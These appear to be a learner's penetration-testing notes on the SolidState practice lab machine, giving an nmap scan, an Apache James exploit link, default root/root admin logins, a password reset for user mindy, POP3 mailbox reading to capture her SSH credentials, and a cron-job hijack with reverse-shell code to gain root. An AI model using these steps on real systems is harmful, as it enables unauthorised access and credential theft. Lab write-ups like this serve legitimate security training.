# Information gathering

## system network

10.10.10.51

## Nmap Scan Result

``` bash
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.13 [10.10.14.13])
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp open  pop3    JAMES pop3d 2.3.2
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
119/tcp open  nntp    JAMES nntpd (posting ok)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Exploit

[Apache James RCE](https://www.exploit-db.com/exploits/50347)

_login apache james admin panel_

```bash
telnet 10.10.10.51 4555
root
root

setpassword mindy mindy
```

_login pop3 server_

```bash
telnet 10.10.10.51 110
USER mindy
PASS mindy
LIST
RETR 1
RETR 2
```

_get login credential of mindy_

![[Pasted image 20221228194823.png]]

_ssh login_

```bash
ssh mindy@10.10.10.51
```

#### Proof

![[Pasted image 20221228201413.png]]

### Lateral Movement



### Privilege Escalation

_linpeas.sh

_pspy32_
![[Pasted image 20221228202503.png]]

[[提权Tips]]

发现定时执行`rm -r /tmp/*`

_search to find a python script_

```bash
grep -r 'rm -r /tmp/*' / 2>/dev/null
```

![[Pasted image 20221228202701.png]]

_insert reverseshell code_

![[Pasted image 20221228202757.png]]

#### proof

![[Pasted image 20221228202508.png]]